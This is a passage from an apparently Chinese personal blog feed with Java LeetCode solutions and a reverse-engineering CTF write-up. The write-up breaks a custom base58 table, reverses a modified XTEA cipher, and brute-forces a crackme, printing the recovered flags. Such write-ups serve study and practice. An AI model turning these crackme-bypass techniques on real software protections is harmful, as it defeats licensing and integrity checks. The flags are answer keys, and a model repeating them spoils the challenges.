class="keyword">int</span> shorter, <span class="keyword">int</span> longer, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (k &lt; <span class="number">0</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (k == <span class="number">0</span>)<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> climb(shorter, longer, k - <span class="number">1</span>) + climb(shorter, longer, k - <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li>非递归方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] divingBoard(<span class="keyword">int</span> shorter, <span class="keyword">int</span> longer, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="keyword">if</span>(k == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (shorter == longer)&#123;</span><br><span class="line">            <span class="keyword">int</span>[] ret = &#123;shorter * k&#125;;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[] board = <span class="keyword">new</span> <span class="keyword">int</span>[k + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">int</span> shortest = k * shorter;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            board[i] = shortest + i * (longer - shorter);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> board;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="重要的员工"><a href="#重要的员工" class="headerlink" title="重要的员工"></a>重要的员工</h2><p><img src="leetcode1.assets/image-20210425111336020.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">retSubImp</span><span class="params">(Employee pre, List&lt;Employee&gt; employees)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (pre.subordinates.isEmpty())&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> imp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Integer sub :</span><br><span class="line">                pre.subordinates) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Employee employee :</span><br><span class="line">                   employees ) &#123;</span><br><span class="line">                <span class="keyword">if</span> (sub == employee.id)&#123;</span><br><span class="line">                    imp += employee.importance;</span><br><span class="line">                    imp += retSubImp(employee, employees);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> imp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getImportance</span><span class="params">(List&lt;Employee&gt; employees, <span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> imp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (Employee staff :</span><br><span class="line">                employees) &#123;</span><br><span class="line">            <span class="keyword">if</span> (staff.id == id)&#123;</span><br><span class="line">                imp += staff.importance;</span><br><span class="line">                <span class="keyword">for</span> (Integer subid :</span><br><span class="line">                        staff.subordinates) &#123;</span><br><span class="line">                    imp += retSubImp(staff, employees);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> imp;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="扫雷"><a href="#扫雷" class="headerlink" title="扫雷"></a>扫雷</h2><p><img src="leetcode1.assets/image-20210426190824816.png"></p><p>这道题有点好玩😛，dfs搜索一共三个步骤</p><ul><li>判断该坐标是否为雷，如果是雷就直接结束游戏</li><li>如果不是雷，判断坐标周围雷的个数，如果个数不为0，则标记雷的个数，结束游戏</li><li>如果周围没有雷，则递归检索周围没有越界的坐标</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> width;</span><br><span class="line"><span class="keyword">int</span> height;</span><br><span class="line"><span class="keyword">int</span> countBomb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span>[][] step = &#123;&#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;,</span><br><span class="line">                &#123;-<span class="number">1</span>, -<span class="number">1</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">1</span>&#125;, &#123;<span class="number">1</span>, -<span class="number">1</span>&#125;, &#123;<span class="number">1</span>, <span class="number">1</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">char</span>[] dic = &#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateBoardDfs</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span>[][] sign)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &gt;= height || x &lt; <span class="number">0</span> || y &gt;= width || y &lt; <span class="number">0</span> || sign[x][y] == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 首先判断周围8个方向是否有雷</span></span><br><span class="line">    getCountBomb(board, x, y);</span><br><span class="line">    <span class="keyword">if</span> (countBomb != <span class="number">0</span>)&#123;</span><br><span class="line">        board[x][y] = dic[countBomb];</span><br><span class="line">        countBomb = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 八个方向</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> post_x = x + step[i][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> post_y = y + step[i][<span class="number">1</span>];</span><br><span class="line">        board[x][y] = <span class="string">&#x27;B&#x27;</span>;</span><br><span class="line">        sign[x][y] = <span class="number">1</span>;</span><br><span class="line">        updateBoardDfs(board, post_x, post_y, sign);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getCountBomb</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> post_x = x + step[i][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> post_y = y + step[i][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (post_x &gt;= height || post_x &lt; <span class="number">0</span> || post_y &gt;= width || post_y &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">if</span> (board[post_x][post_y] == <span class="string">&#x27;M&#x27;</span>)</span><br><span class="line">            countBomb++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 判断点击是否为雷</span></span><br><span class="line"><span class="comment"> * 检索周围8个方向是否有雷，无雷标记为B</span></span><br><span class="line"><span class="comment"> * 有雷标检索有雷个数，然后标记数字</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">char</span>[][] updateBoard(<span class="keyword">char</span>[][] board, <span class="keyword">int</span>[] click)&#123;</span><br><span class="line">    width = board[<span class="number">0</span>].length;</span><br><span class="line">    height = board.length;</span><br><span class="line">    <span class="keyword">int</span>[][] sign = <span class="keyword">new</span> <span class="keyword">int</span>[height][width];</span><br><span class="line">    <span class="comment">// 玩家点击矩阵坐标</span></span><br><span class="line">    <span class="keyword">char</span> playerClickPot = board[click[<span class="number">0</span>]][click[<span class="number">1</span>]];</span><br><span class="line">    <span class="keyword">if</span> (playerClickPot == <span class="string">&#x27;M&#x27;</span>)&#123;</span><br><span class="line">        board[click[<span class="number">0</span>]][click[<span class="number">1</span>]] = <span class="string">&#x27;X&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        updateBoardDfs(board, click[<span class="number">0</span>], click[<span class="number">1</span>],  sign);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> board;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在D天内送达包裹的能力"><a href="#在D天内送达包裹的能力" class="headerlink" title="在D天内送达包裹的能力"></a>在D天内送达包裹的能力</h2><p><img src="leetcode1.assets/image-20210426220019030.png"></p><p><img src="https://f1sh-blog.oss-cn-beijing.aliyuncs.com/img/image-20210426220051541.png"></p><p>看题解打卡下班</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">shipWithinDays</span><span class="params">(<span class="keyword">int</span>[] weights, <span class="keyword">int</span> D)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> left = Arrays.stream(weights).max().getAsInt();</span><br><span class="line">        <span class="keyword">int</span> right = Arrays.stream(weights).sum();</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right)&#123;</span><br><span class="line">            <span class="keyword">int</span> middle = (left+right) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> needDay = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> goodWeight : weights)&#123;</span><br><span class="line">                <span class="keyword">if</span> (sum + goodWeight &gt; middle)&#123;</span><br><span class="line">                    needDay++;</span><br><span class="line">                    sum = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                sum += goodWeight;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (needDay &lt;= D)&#123;</span><br><span class="line">                right = middle;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = middle + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;towsum&quot;&gt;&lt;a href=&quot;#towsum&quot; class=&quot;headerlink&quot; title=&quot;towsum&quot;&gt;&lt;/a&gt;towsum&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;leetcode1.assets/image-20210426220730463.png</summary>
      
    
    
    
    <category term="LeetCode" scheme="http://example.com/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="http://example.com/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>红明谷/虎符CTF-re题解</title>
    <link href="http://example.com/2021/04/08/CTF/wp/%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF/"/>
    <id>http://example.com/2021/04/08/CTF/wp/%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF/</id>
    <published>2021-04-08T12:56:46.830Z</published>
    <updated>2021-05-07T11:26:01.219Z</updated>
    
    <content type="html"><![CDATA[<h2 id="红明谷-g0"><a href="#红明谷-g0" class="headerlink" title="红明谷-g0"></a>红明谷-g0</h2><p>看名字就是go语言题目，用<code>IDA-golang-helper</code>还原符号表之后，看到只有几个函数，其中<code>main_Encode</code>就是加密函数</p><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210408210534162.png"></p><p>函数逻辑比较简单，输入长度等于20，打乱位置，进入<code>main_Encode</code>加密，最后进入<code>main_fun1</code>进行比较，直接看<code>main_Encode</code>中的加密算法</p><p>动态调试后发现一张表，表的长度为58位，判断为换表base58加密</p><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210408211106286.png"></p><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210408211130873.png"></p><p>进入<code>main_fun1</code>函数中找到加密后的字符串，注意 <code>runtime_memequal</code>这个比较的函数需要在汇编中寻找比较的字符串首地址，在伪代码中是找不到的</p><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210408211846445.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base58</span><br><span class="line"></span><br><span class="line">Cipher = <span class="string">&#x27;2GVdudkYo2CBXoQii7gfpkjTc4gT&#x27;</span></span><br><span class="line">Plain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">new_table = <span class="string">&#x27;12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345&#x27;</span></span><br><span class="line">old_table = <span class="string">&#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(Cipher)):</span><br><span class="line">    Plain += old_table[new_table.index(Cipher[i])]</span><br><span class="line">print(base58.b58decode(Plain.encode()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;We1CTFc0m_2345&#125;</span></span><br></pre></td></tr></table></figure><h2 id="虎符-re"><a href="#虎符-re" class="headerlink" title="虎符-re"></a>虎符-re</h2><p><code>mips</code>架构文件，本来想用<code>qemu</code>动态调试的，但是好像虚拟机的so文件出问题了，就静态分析算了，反正有<code>IDA7.5</code>不怕</p><p>看伪代码很浓厚的C++气息，两次判断，<code>pre</code>函数里面还判断了输入的长度</p><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210408213206822.png"></p><p><code>server_check_redemption_code</code>函数大概的意思就是生成一张宽256长和字符串长度相同的表，当表的列值与输入的字符串的ASCII值相同时就做一个标记，用C语言还原后的代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> <span class="built_in">string</span>[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> input[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> string_len = <span class="built_in">strlen</span>(<span class="built_in">string</span>);</span><br><span class="line"><span class="keyword">int</span> input_len = <span class="built_in">strlen</span>(input);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>* s = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(input_len &lt;&lt; <span class="number">10</span>);<span class="comment">// input_len * 2^10</span></span><br><span class="line"><span class="built_in">memset</span>((<span class="keyword">void</span>*)s, <span class="number">0</span>, input_len &lt;&lt; <span class="number">10</span>);</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; input_len; i++) &#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++) &#123;</span><br><span class="line"><span class="keyword">if</span> (j != input[i]) &#123;</span><br><span class="line">s[<span class="number">256</span> * i + j] = s[<span class="number">256</span> * count + j]; <span class="comment">//其他全是填充这个</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">s[<span class="number">256</span> * i + j] = i + <span class="number">1</span>; <span class="comment">//每一次循环只执行一次这个</span></span><br><span class="line">&#125;</span><br><span class="line">count = s[<span class="number">256</span> * count + input[i]]; <span class="comment">//count=i+1</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> sign = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; string_len; k++) &#123;</span><br><span class="line">sign = s[<span class="number">256</span> * sign + <span class="built_in">string</span>[k]];</span><br><span class="line"><span class="keyword">if</span> (sign == input_len) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, k - input_len + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/// k-input_len+1=7</span></span><br><span class="line"><span class="comment">/// k=6+0xE=</span></span><br></pre></td></tr></table></figure><p>题目中有两个字符串，所以生成了两张表，两张表中相同的值就是需要输入的flag</p><p><code>Ninja Must Die 3 Is A Cruel Game, So Hard For Me</code></p><p><code>I Love Ninja Must Die 3. Beautiful Art And Motive Operation Is Creative.</code></p><p>两个字符串中相同的值为<code>Ninja Must Die</code></p><h2 id="虎符-gocrypt"><a href="#虎符-gocrypt" class="headerlink" title="虎符-gocrypt"></a>虎符-gocrypt</h2><p>变种的<code>xtea</code>在写脚本的时候忘记了小端存储，这个地方搞了很久，以后遇到不能在犯错误了</p><p>用插件还原符号表后看到函数并没有多少，输入检测函数<code>main_check</code>，数据加密函数<code>main_main__ptr_myCipher_Encrypt</code></p><p><code>main_check</code>函数中有一个正则匹配来规定flag输入的格式</p><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210409083421073.png" alt="main_check"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">正则匹配格式：flag&#123;([0-9a-f]&#123;8&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;4&#125;)-([0-9a-f]&#123;12&#125;)&#125;</span><br></pre></td></tr></table></figure><p>在进入<code>main_check</code>返回一个值给标志，判断是否进入下一个步骤</p><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210409083659618.png"></p><p><code>main__ptr_myCipher_Encrypt</code>函数中的加密算法就是变种的<code>xtea</code>加密，随机数变成了<code>0x12345678</code></p><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210409082900061.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">XTEA_decrypt</span><span class="params">(<span class="keyword">uint32_t</span> rounds, <span class="keyword">uint32_t</span>* v, <span class="keyword">uint32_t</span>* k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> delta = <span class="number">0x12345678</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> sum = rounds * delta;</span><br><span class="line"><span class="keyword">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rounds; i++) &#123;</span><br><span class="line">v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + k[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">sum -= delta;</span><br><span class="line">v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + k[sum &amp; <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> rounds = <span class="number">32</span>;</span><br><span class="line"><span class="keyword">uint32_t</span> v[<span class="number">2</span>][<span class="number">2</span>] = &#123; &#123; <span class="number">0x0ec311f0</span>, <span class="number">0x45c79af3</span> &#125;,</span><br><span class="line"> &#123; <span class="number">0xedf5d910</span>, <span class="number">0x542702cb</span> &#125; &#125;;</span><br><span class="line"><span class="keyword">uint32_t</span> k[<span class="number">4</span>] = &#123; <span class="number">0x00010203</span>, <span class="number">0x04050607</span>, <span class="number">0x08090a0b</span>, <span class="number">0x0c0d0e0f</span> &#125;;</span><br><span class="line"></span><br><span class="line">XTEA_decrypt(rounds, v[<span class="number">0</span>], k);</span><br><span class="line">XTEA_decrypt(rounds, v[<span class="number">1</span>], k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x-%x\n&quot;</span>, v[<span class="number">0</span>][<span class="number">0</span>], v[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%x-%x\n&quot;</span>, v[<span class="number">1</span>][<span class="number">0</span>], v[<span class="number">1</span>][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;3bbcf9ea-2918-4fee-8a2e-201b47dfcb4e&#125;</span></span><br></pre></td></tr></table></figure><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210409084718527.png"></p><h2 id="虎符-CrackMe"><a href="#虎符-CrackMe" class="headerlink" title="虎符-CrackMe"></a>虎符-CrackMe</h2><p>这个题需要输入两次，第一次输入后判断输入的长度，长度需要17位，输入后将输入的字符串的前7位和后10位分割，分别存储在不同的内存中</p><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210409085306463.png"></p><p>第二次输入需要输入一个数字，在经过两轮简单的计算后与指定的两个值进行比较，直接写脚本爆破，最后计算出需要输入的值为<code>90038</code></p><p><img src="%E7%BA%A2%E5%90%8D%E8%B0%B7-%E8%99%8E%E7%AC%A6CTF.assets/image-20210409085615540.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 爆破脚本，单线程大概需要半个小时左右</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 